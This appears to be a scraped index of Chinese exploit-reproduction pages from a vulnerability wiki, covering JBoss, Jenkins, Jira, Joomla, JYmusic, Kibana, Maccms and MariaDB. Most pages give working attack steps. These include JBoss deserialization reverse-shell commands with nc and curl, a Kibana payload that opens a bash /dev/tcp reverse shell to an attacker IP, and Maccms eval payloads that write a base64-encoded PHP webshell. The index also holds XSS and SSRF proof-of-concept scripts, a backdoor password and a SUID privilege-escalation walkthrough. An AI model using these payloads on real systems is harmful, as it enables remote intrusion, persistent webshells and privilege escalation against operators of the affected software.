Getshell.html","title":"Administration Console 弱口令 Getshell","keywords":"","body":"Administration Console 弱口令 Getshell 一、漏洞简介 Administration Console 存在默认密码 admin admin 我们可以登录到后台部署war包getshell 二、漏洞影响 全版本 三、复现过程 1、点击Administration console 2、输入弱口令 admin admin 进去 3、点击Web application ,然后点击右上角的add 4、把文件传上去即可getshell 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 14:24:00 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞.html":{"url":"0day/Jboss/（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞.html","title":"（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞","keywords":"","body":"（CVE-2013-4810）JBoss EJBInvokerServle 反序列化漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 win7一台，ip为172.26.1.151（靶机，安装了java环境） kali一台，ip为192.168.1.192(攻击机) 输入http://172.26.1.151:8080/invoker/EJBInvokerServle 返回如图（图片是CVE-2015-7501的图片。差不多就是这个意思。凑活看哈~），说明接口开发，存在反序列化漏洞 进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 ,执行命令: javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 继续执行命令: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令: curl http://172.26.1.151:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser 打开nc界面，发现shell已经弹回来了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 14:35:47 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞.html":{"url":"0day/Jboss/（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞.html","title":"（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞","keywords":"","body":"（CVE-2015-7501）JBoss JMXInvokerServlet 反序列化漏洞 一、漏洞简介 由于JBoss中invoker/JMXInvokerServlet路径对外开放，JBoss的jmx组件支持Java反序列化 二、漏洞影响 Red Hat JBoss A-MQ 6.x版本；BPM Suite (BPMS) 6.x版本；BRMS 6.x版本和5.x版本；Data Grid (JDG) 6.x版本；Data Virtualization (JDV) 6.x版本和5.x版本；Enterprise Application Platform 6.x版本，5.x版本和4.3.x版本；Fuse 6.x版本；Fuse Service Works (FSW) 6.x版本；Operations Network (JBoss ON) 3.x版本；Portal 6.x版本；SOA Platform (SOA-P) 5.x版本；Web Server (JWS) 3.x版本；Red Hat OpenShift/xPAAS 3.x版本；Red Hat Subscription Asset Manager 1.3版本。 三、复现过程 win7一台，ip为172.26.1.151（靶机，安装了java环境） kali一台，ip为192.168.1.192(攻击机) 输入http://172.26.1.151:8080/invoker/JMXInvokerServlet 返回如图，说明接口开发，存在反序列化漏洞 进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 ,执行命令: javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 继续执行命令: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令: curl http://172.26.1.151:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser 打开nc界面，发现shell已经弹回来了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-25 14:34:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞.html":{"url":"0day/Jboss/（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞.html","title":"（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞","keywords":"","body":"（CVE-2017-7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 一、漏洞简介 JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 二、漏洞影响 JBoss AS 4.x及之前版本 三、复现过程 win7一台，ip为172.26.1.127（靶机，安装了java环境） kali一台，ip为192.168.1.192(攻击机) 输入http://172.26.1.127:8080/jbossmq-httpil/HTTPServerILServlet，如果显示下图，则可能存在漏洞 进入kali攻击机，下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 ,执行命令: 2继续执行命令: java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了，执行命令: curl http://172.26.1.127:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser 回到nc界面，发现shell已经反弹回来了 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 14:21:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jboss/（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞.html":{"url":"0day/Jboss/（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞.html","title":"（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞","keywords":"","body":"（CVE-2017-12149）JBosS AS 6.X 反序列化漏洞 一、漏洞简介 JBOSSApplication Server反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码。漏洞危害程度为高危(High)。 二、漏洞影响 JBoss 5.x - 6.x 三、复现过程 win7一台,ip为 172.26.1.125（靶机，安装了java环境) kali一台,ip为 192.168.1.192（攻击机） 进入http://172.26.1.125:8080/invoker/readonly,若显示状态码为500的报错界面，则证明漏洞是存在的 进入攻击机kali,下载反序列化工具:https://github.com/ianxtianxt/CVE-2015-7501/ 解压完，进入到这个工具目录 执行命令:javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java 继续执行命令:java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.73.131:4444（IP是攻击机ip,4444是要监听的端口) 新界面开启nc准备接收反弹过来的shell。命令:nc -lvnp 4444 这个时候在这个目录下生成一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了 curl http://172.26.1.125:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser 这时候我们再看nc，发现shell已经弹回来了. 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-21 14:22:39 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jenkins/（CVE-2019-10475）.html":{"url":"0day/Jenkins/（CVE-2019-10475）.html","title":"（CVE-2019-10475）反射xss","keywords":"","body":"（CVE-2019-10475） 插件反射型xss 一、漏洞简介 二、漏洞影响 360 FireLine插件， 最高包括1.7.2 Bitbucket OAuth插件， 最高包括0.9 Build-metrics插件 1.3及以下 部署WebLogic Plugin 最高至4.1 Dynatrace应用程序监视插件， 最高包括2.1.3 Dynatrace应用程序监视插件， 最高包括2.1.4 ElasticBox Jenkins Kubernetes CI / CD插件， 最高至1.3 包含1.1.4及以下版本的 全局Post Script插件 Libvirt Slaves插件， 最高包括1.8.5 截至 2.7.0的 Mattermost Notification插件 Sonar Gerrit插件， 最高包括2.3 Zulip插件 （包括1.1.0及以下） 三、复现过程 1、手工复现 该vulnearble插件位于http://localhost:8080/plugin/build-metrics/，漏洞参数为label。 http://192.168.1.75:8080/plugin/build-metrics/getBuildStats?label=alert(\"CVE-2019-10475\")&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search 2、利用脚本 #!/usr/bin/env python import sys import argparse VULN_URL = '''{base_url}/plugin/build-metrics/getBuildStats?label={inject}&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search''' def get_parser(): parser = argparse.ArgumentParser(description='CVE-2019-10475') parser.add_argument('-p', '--port', help='port', default=80, type=int) parser.add_argument('-d', '--domain', help='domain', default='localhost', type=str) parser.add_argument('-i', '--inject', help='inject', default='alert(\"CVE-2019-10475\")', type=str) return parser def main(): parser = get_parser() args = vars(parser.parse_args()) port = args['port'] domain = args['domain'] inject = args['inject'] if port == 80: base_url = f'http://{domain}' elif port == 443: base_url = f'https://{domain}' else: base_url = f'http://{domain}:{port}' build_url = VULN_URL.format(base_url=base_url, inject=inject) print(build_url) return 0 if __name__ == '__main__': sys.exit(main()) Usage: $ python3 CVE-2019-10475.py --help usage: CVE-2019-10475.py [-h] [-p PORT] [-d DOMAIN] [-i INJECT] CVE-2019-10475 optional arguments: -h, --help show this help message and exit -p PORT, --port PORT port -d DOMAIN, --domain DOMAIN domain -i INJECT, --inject INJECT inject 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-08 00:46:07 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Jira/1.html":{"url":"0day/Jira/1.html","title":"（CVE-2019-8451）Jira未授权SSRF漏洞验证","keywords":"","body":"（CVE-2019-8451）Jira未授权SSRF漏洞验证 一、漏洞简介 （CVE-2019-8451）Jira未授权SSRF漏洞验证 二、影响范围 三、复现过程 https://github.com/ianxtianxt/CVE-2019-8451 #coding:utf-8 import requests host = 'http://xx.xx.xx.xx:8080' header = { 'X-Atlassian-Token': 'no-check', 'Connection': 'close' } url = host + '/plugins/servlet/gadgets/makeRequest?url='+host+'@www.baidu.com/' html = requests.get(url = url,headers = header) print html.text 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Joomal/1.html":{"url":"0day/Joomal/1.html","title":"Joomla 3.4.6 - 'configuration.php' Remote Code Execution","keywords":"","body":"Joomla 3.4.6 - 'configuration.php' 远程代码执行 一、漏洞简介 Joomla 3.4.6 - 'configuration.php' Remote Code Execution 二、影响范围 Joomla 3.0.0 至 3.4.6 三、复现过程 https://github.com/ianxtianxt/Joomla-3.4.6---configuration.php-Remote-Code-Execution 脚本验证 验证： python3 test.py -t http://127.0.0.1:8080/ 显示“Vulnerable”证明存在漏洞 利用： python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121 执行成功 并在“configuration.php”写入随机密码的一句话木马 上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi 蚁剑链接测试 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-05 01:28:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Joomal/2.html":{"url":"0day/Joomal/2.html","title":"joomscan","keywords":"","body":"joomscan 一、漏洞简介 joomscan 二、影响范围 三、复现过程 https://github.com/rezasp/joomscan 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-10-29 13:15:26 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/JYmusic/3.html":{"url":"0day/JYmusic/3.html","title":"JYmusic 1.x 版本 前台getshell","keywords":"","body":"JYmusic 1.x 版本 前台getshell 一、漏洞简介 二、漏洞影响 1.x版本 三、复现过程 访问前台，注册一个用 注册成功后点击右上角设置，个人资料，头像设置 抓包，修改文件后缀为.php 上传成功后访问个人中心，这里头像已经换了，审查元素查看头像的文件路径 访问http://0-sec.org/Uploads/Avatars/uid_2/128.php 成功解析，通过这种办法上传一个phpinfo 访问文件 四、参考链接 > 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 19:39:35 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/JYmusic/2.html":{"url":"0day/JYmusic/2.html","title":"JYmusic 2.0 前台XSS漏洞","keywords":"","body":"JYmusic 2.0 前台XSS漏洞 一、漏洞简介 二、漏洞影响 三、复现过程 利用条件 1.登录会员 2.认证音乐人 上传音乐时，抓包，修改name或者cover_url参数 值为： XSS\">alert(document.cookie)> 此时提交的音乐就会存储到数据库中，由于name和cover_url没有过滤，导致在后台管理员审核的时候会触发一个XSS 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-16 19:35:36 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/JYmusic/1.html":{"url":"0day/JYmusic/1.html","title":"JYmusic 2.0 命令执行漏洞","keywords":"","body":"（CNVD-2019-06251）JYmusic 2.0 命令执行漏洞 一、漏洞简介 CNVD-2019-06251 二、漏洞影响 三、复现过程 漏洞分析 危险函数 /core/library/think/Request.php类中的filterValue函数中，使用了call_user_func函数。 通过构造使得$filter=system， $value=dir ，通过call_user_func函数即可执行系统命令” dir ”。 array_walk_recursive函数 /core/library/think/Request.php类中的input函数里调用了通过array_walk_recursive函数调用了filterValue函数。array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。 input函数 /core/library/think/Request.php中的param函数调用了input函数。 exec 函数 /core/library/think/App.php类中的exec 函数通过Request::instance()->param()调用了param函数。 run函数 /core/library/think/App.php类中的run函数则调用了exec函数 传入的dispatch和dispatch和dispatch和config两个参数分别来自于/core/library/think/App.php类中run函数里的： 变量覆盖 /core/library/think/App.php类中run函数里，获取dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过dispatch变量值时调用了routeCheck函数。routeCheck函数中则通过Route::chekc调用了check函数。/core/library/think/Route.php类中，check函数通过request->method()调用了method函数。 /core/library/think/Request.php类中，通过post参数_method=__construct调用构造函数： 在构造函数里用filter=system覆盖类中的filter变量。 post参数 method=GET 就是要再次调用method函数，并且使得if(true===$method)为真，从而获取 _SERVER[REQUEST_METHOD]=dir 这个参数值。 调用入口 /core/library/think/App.php类中的run函数，则是在index.php入口函数中调用。 漏洞复现 拦截首页请求，Change request method修改请求方式为POST 参数： POST的参数的作用已在漏洞分析环节分析。 filter=system&_SERVER[REQUEST_METHOD]=dir&_method=__construct&method=GET POST参数后不能有\\r\\n回车换行，如果有就不能成功执行。 POST /captcha HTTP/1.1 //请求一个验证码，引导程序的运行步骤。 写入shell filter=system&_SERVER[REQUEST_METHOD]=echo “” >test.php&_method=__construct&method=GET phpinfo() http://0-sec.org/test.php?test=phpinfo(); //末尾一定要跟一个“分号” “ ; ” ，如果没有则不能成功执行。 四、参考链接 https://blog.csdn.net/yun2diao/article/details/91345116 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-03-03 15:54:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/kibana/1.html":{"url":"0day/kibana/1.html","title":"（CVE-2019-7609）kibana < 6.6.0 未授权远程代码命令执行","keywords":"","body":"（CVE-2019-7609）kibana 一、漏洞简介 Kibana 是一款开源的数据分析和可视化平台，它是Elastic Stack成员之一，设计用于和Elasticsearch协作。 二、漏洞影响 kibana 三、复现过程 环境搭建 docker pull docker.elastic.co/kibana/kibana:6.5.4 docker network create elastic docker run --network=elastic --name=elasticsearch docker.elastic.co/elasticsearch/elasticsearch:6.5.4 docker run -d --name kibana --net elastic -p 5601:5601 docker.elastic.co/kibana/kibana:6.5.4 docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' kibana 这样启动的kibana没法调试，可以自己改改镜像，在node启动命令里加个inspect参数： docker ps -a --no-trunc # 找到启动脚本 在node启动命令后加上--inspect=0.0.0.0:9229 docker commit kibana kibana-debug # 保存修改后的镜像 docker rm -f kibana docker run --name kibana --net elastic -p 5601:5601 -p 9229:9229 kibana-debug # 启动修改后的kibana容器 kibana控制台：http://127.0.0.1:5601/ inspect调试器：chrome://inspect/ 漏洞分析 原型链污染点：props()函数可以给对象设置属性 有了污染点，就可以思考怎么利用了。 最简单的利用，设置一个cookie就可以导致拒绝服务： .es(*).props(label.__proto__.cookie=\"aaa\") 要复原的话可以在inspect调试器里删掉原型对象的cookie属性： DOS很好实现，怎么搞成RCE呢？根据经验，容易想到一些常见情形，如： if(obj.jsCode) eval(obj.jsCode) 这种白给的 express ejs模版引擎中的动态函数调用 作者并没有找到明显的代码执行点，但是在瞎点到canvas的时候，他发现控制台暴了很多错误（这是inpector的输出，也就是说如果启docker的时候加了-d的话，可能就错过这个RCE了...）。 作者据此得出结论：kibana在创建新进程 创建进程可就是个敏感的行为了，能不能污染命令/参数呢？ 来动态看下进程创建的过程， 首先调用normalizeSpawnArguments.apply()处理参数， 跟进， 这里实际是在处理child_process.spawn(command[, args][, options])的第三个参数options。 这里面的有些参数是undefined的，只有声明了才会处理，也即是我们可以污染的。 作者利用的就是这个env参数，它以键值对的形式向子进程传递环境变量（我尝试了一些其它参数，没发现可利用的）。 能控制进程的环境变量了，有什么用呢？我们不知道子进程会对环境变量做些什么操作啊，这是容易被忽视的一个重点。 回想下控制台报的错：\"Starting inspector on 0.0.0.0:9229 failed: address already in use\"。 这句话透露出的是：此时正在创建一个node命令进程，并且使用了--inpect:0.0.0.0:9229参数。 这下目标就清晰了，我们能控制的node的环境变量。 在node中，有一个NODE_OPTIONS变量， 通过这个变量，可以覆盖node进程的参数。 也就是说，现在我们能控制node进程的参数了。这就很有用了，比如--eval参数是可以直接执行代码的。 但是，NODE_OPTIONS似乎考虑到了这种潜在的安全问题，它只能使用部分参数，向--eval这种是用不了的。 不过作者找到了另一个参数--require， 这个有点像php里的auto_prepend_file，预加载一个文件。 现在我们可以看成有一个文件包含的洞了，怎么RCE呢？ 通常，我们都会上传一个文件再包含，或者去包含web服务器日志/SSH日志。 作者这里利用的方法也十分巧妙，Linux下一切皆文件，我们已经能控制子进程的环境变量，也就是能控制/proc/self/environ这个文件，直接包含这个文件不就好了。 最后payload如下： 将POC里的反链IP地址换成自己的，然后在目标机器上的 Timelion 选项下将以下 POC 粘贴进去，然后点击 Run 运行： .es(*).props(label.__proto__.env.AAAA='require(\"child_process\").exec(\"bash -c \\'bash -i>& /dev/tcp/10.70.53.113/6666 0>&1\\'\");//') .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ') 然后自己机器开启监听，再点击 Canvas 即可出发漏洞 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-02-09 00:51:03 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/3.html":{"url":"0day/Maccms/3.html","title":"Maccms后门","keywords":"","body":"Maccms后门 一、漏洞简介 有人假冒苹果cms官网，发布带有后门的程序。 二、漏洞影响 version v10 三、复现过程 后门文件路径 maccms10\\extend\\upyun\\src\\Upyun\\Api\\Format.php maccms10\\extend\\Qcloud\\Sms\\Sms.php 密码 WorldFilledWithLove 后门样本 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-15 21:04:19 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/1.html":{"url":"0day/Maccms/1.html","title":"Maccms 8.x(苹果cms)命令执行漏洞","keywords":"","body":"Maccms 8.x(苹果cms)命令执行漏洞 一、漏洞简介 搜索页面搜索参数过滤不严 导致直接eval执行PHP语句，前台命令执行可getshell 二、漏洞影响 Maccms 8.x 三、复现过程 payload： http://0-sec.org/index.php?m=vod-search&wd={if-A:phpinfo()}{endif-A} getshell payload（a）: http://0-sec.org/index.php?m=vod-search&wd={if-A:assert($_POST[a])}{endif-A} POST a=phpinfo() 写入网站根目录一句话木马文件payload（文件名：test.php，密码：test）: http://0-sec.org/index.php?m=vod-search&wd={if-A:print(fputs%28fopen%28base64_decode%28dGVzdC5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW3Rlc3RdKTsgPz4%29%29)}{endif-A} 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-12-21 11:49:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/4.html":{"url":"0day/Maccms/4.html","title":"Maccms 8.x(苹果cms)post注入","keywords":"","body":"Maccms 8.x post注入 一、漏洞简介 苹果cms 8.x 注入 二、漏洞影响 Maccms 8.x 三、复现过程 POST /index.php?m=vod-search HTTP/1.1 Host: 0-sec.org Content-Length: 500137 Cache-Control: max-age=0 Origin: http://word.o2oxy.cn Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Referer: http://word.o2oxy.cn/index.php?m=vod-search Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8 Cookie: Hm_lvt_ff7f6fcad4e6116760e7b632f9614dc2=1574418087,1574670614,1574673402,1575271439; Hm_lvt_137ae1af30761db81edff2e16f0bf0f8=1574418087,1574670615,1574673402,1575275889; pgv_pvi=8322096128; PHPSESSID=pr37r8fkshd854f8fnfep4ov53; adminid=1; adminname=admin; adminlevels=b%2Cc%2Cd%2Ce%2Cf%2Cg%2Ch%2Ci%2Cj; admincheck=2afdbd385cb6c2af162e6733f1b0e2d2 Connection: close wd=uniona(这里a为80w个，可用Burp直接生成){if-A:print(fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29)}{endif-A} 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2020-01-12 05:42:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Maccms/2.html":{"url":"0day/Maccms/2.html","title":"（CVE-2019-9829）Maccms背景任意文件写入getshell","keywords":"","body":"（CVE-2019-9829）Maccms背景任意文件写入getshell 一、漏洞简介 二、漏洞影响 v10 三、复现过程 登录到后台，单击基本->类别管理；您可以看到用于每个类别的类别页面模板。您会看到这里使用的模板是/art/type.html 在后台，您可以编辑模板：单击模板-“模板管理”，转到./template/default_pc/html/art的模板管理区域，单击“编辑”， 输入php代码。 访问 index.php/art/type/id/5.html PHP代码成功执行。 原理分析 该程序最初旨在禁止将模板更改为PHP文件： 但是，在渲染模板时，该程序会将模板文件写入缓存文件，然后将其包含在“ include”中，因此，禁止将模板更改为php文件后，仍然可以执行代码。 零组资料文库 all right reserved，powered by 0-sec.org未经授权禁止转载 2019-11-29 15:48:51 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Mariadb/CVE-2020-7221.html":{"url":"0day/Mariadb/CVE-2020-7221.html","title":"（CVE-2020-7221）Mariadb 提权漏洞","keywords":"","body":"（CVE-2020-7221）Mariadb 提权漏洞 一、漏洞简介 MariaDB 10.4.7到10.4.11中的mysql_install_db允许将特权从mysql用户帐户升级到root用户，因为chown和chmod的执行不安全，如对auth_pam_tool_dir / auth_pam_tool的chmod 04755的symlink攻击所证明的那样。注意：这不会影响Oracle MySQL产品，该产品以不同的方式实现mysql_install_db。 二、漏洞影响 Mariadb 10.4.7到10.4.11 三、复现过程 docker环境搭建： docker pull mariadb:10.4.8 docker run -it 2ef19234ff46 /bin/bash 漏洞分析 首先定位漏洞点。 find / -name \"mysql_install_db\" 在bash脚本上下文中，如果$user被定义则能进入「配置不当」漏洞点。 chown $user \"$pamtooldir/auth_pam_tool_dir\" chmod 0700 \"$pamtooldir/auth_pam_tool_dir\" 这里配置了auth_pam_tool_dir目录的归属权和所有权，权限归属于$user。 （这里是可控点之一） chown 0 \"$pamtooldir/auth_pam_tool_dir/auth_pam_tool\" chmod 04755 \"$pamtooldir/auth_pam_tool_dir/auth_pam_tool\" 这里配置了auth_pam_tool文件为0（root）所有权，4755文件权限（4为suid权限）。想要进入这个漏洞点需要$srcdir变量值长度为0才能触发。 关于suid属性： SUID属性一般用在可执行文件上，当用户执行该文件时，会「临时拥有该执行文件的所有者权限」。一旦程序拥有SUID权限的话，运行该程序时会以最高权限运行。 回溯 $srcdir 与 $user $user 在脚本传递args参数时可控制$user变量。 $srcdir 也在初始化操作时可控制变量，初始化时为空。 那么想要进入这个漏洞点需要$srcdir为空，$user需要设置值。 结合上文描述使用此命令才能触发漏洞点： ./mysql_install_db --user=mysql 漏洞复现 寻找suid属性的程序 find /* -perm -u=s -type f 2>/dev/null 搜索到的suid属性程序「auth_pam_tool」替换成我们的恶意suid程序。 1. rm auth_pam_tool 2. ln -s /root/pwn auth_pam_tool 3. export PATH=.:$PATH 4. ln -s /bin/bash ps 编写一个具有suid权限的恶意程序： #include #include int main(void) { setuid(0); setgid(0); system(\"ps\"); return 0; } 切换回root，在root权限下运行mysql_install_db脚本（触发修改chmod命令） 再回到mysql用户权限下执行auth_pam_tool 提权成功。 可以看到这个漏洞是由于suid与目录权限设置不当，才导致被提权利用的风险。建议在修复中设置auth_pam_tool_dir目录权限为root所有： root:mysql 0750 /usr/lib/mysql/plugin/auth_pam_tool_dir 参考链接 